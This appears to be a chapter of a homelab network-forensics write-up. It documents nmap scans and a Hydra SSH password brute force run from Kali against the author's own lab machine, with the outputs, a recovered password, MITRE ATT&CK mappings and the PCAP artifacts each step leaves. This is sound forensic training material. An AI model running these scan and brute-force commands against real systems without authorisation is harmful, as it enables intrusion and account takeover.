# 03 — Attack Scenario

## Overview

Four attacks were executed from Kali (192.168.178.129) against aegis-sentinel (192.168.178.126) while `tcpdump` captured all traffic. The attack sequence mirrors Ch.01/02 but with an additional nmap flag for richer forensic evidence.

---

## Attack Sequence

### Step 1 — tcpdump Start (aegis-sentinel)

```bash
sudo tcpdump -i enp0s3 -w /tmp/ch03_full.pcap
```

Started **before** all attacks. Captures every packet on the network.

---

### Step 2 — nmap SYN Scan (Kali)

```bash
sudo nmap -sS -A -T4 192.168.178.126
```

| Flag | Meaning |
|:-----|:--------|
| `-sS` | SYN scan — half-open, never completes TCP handshake |
| `-A` | Aggressive — OS detection, version detection, traceroute |
| `-T4` | Timing template 4 — fast scan |

**Result:**
```
PORT   STATE  SERVICE  VERSION
22/tcp open   ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
OS:    Linux 4.15-5.19
Network Distance: 1 hop
```

**MITRE ATT&CK:** T1595 — Active Scanning

---

### Step 3 — nmap OS Fingerprinting (Kali)

```bash
sudo nmap -O 192.168.178.126
```

| Flag | Meaning |
|:-----|:--------|
| `-O` | OS detection — sends unusual TCP probes to fingerprint OS |

**Result:**
```
PORT   STATE  SERVICE
22/tcp open   ssh
Device type: general purpose
Running: Linux 4.X|5.X
OS details: Linux 4.15 – 5.19
```

**Key forensic artifact:** Sends `[FIN, SYN, PSH, URG]` combined flags — impossible in normal traffic, unique nmap fingerprint visible in PCAP.

**MITRE ATT&CK:** T1595 — Active Scanning

---

### Step 4 — nmap Service Version Detection (Kali)

```bash
sudo nmap -sV 192.168.178.126
```

| Flag | Meaning |
|:-----|:--------|
| `-sV` | Service version detection — connects to open ports and reads banners |

**Result:**
```
PORT   STATE  SERVICE  VERSION
22/tcp open   ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
```

**Key forensic artifact:** nmap identifies itself in SSH banner exchange:
```
Client: Protocol (SSH-2.0-NmapNSE-1.0)
Client: Protocol (SSH-2.0-Nmap-SSH2-Hostkey)
```

**MITRE ATT&CK:** T1595 — Active Scanning

---

### Step 5 — Hydra SSH Brute Force (Kali)

```bash
hydra -l aegis-siem -P /tmp/rockyou_9800.txt ssh://192.168.178.126
```

| Flag | Meaning |
|:-----|:--------|
| `-l aegis-siem` | Single username to target |
| `-P /tmp/rockyou_9800.txt` | Password list starting at line 9800 |
| `ssh://` | Protocol — SSH on default port 22 |

**Result:**
```
[22][ssh] host: 192.168.178.126   login: aegis-siem   password: 1111
1 of 1 target successfully completed, 1 valid password found
```

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing → T1078 — Valid Accounts

---

### Step 6 — tcpdump Stop (aegis-sentinel)

`Ctrl+C` to stop capture. PCAP saved to `/tmp/ch03_full.pcap`.

---

## MITRE ATT&CK Kill Chain

| Phase | Technique | ID | Tool | Evidence in PCAP |
|:------|:----------|:---|:-----|:-----------------|
| Reconnaissance | Active Scanning | T1595 | nmap -sS | SYN flood, Win=1024 fingerprint |
| Reconnaissance | Active Scanning | T1595 | nmap -O | FIN+SYN+PSH+URG combined flags |
| Reconnaissance | Active Scanning | T1595 | nmap -sV | SSH-2.0-NmapNSE banner in cleartext |
| Credential Access | Brute Force: Password Guessing | T1110.001 | Hydra | Repeated Key Exchange Init pattern |
| Initial Access | Valid Accounts | T1078 | Hydra | Large encrypted session packets |

---

*homelab_AEGIS · github.com/cyb-ersin · Ch.03 — Network Forensics & PCAP Analysis*
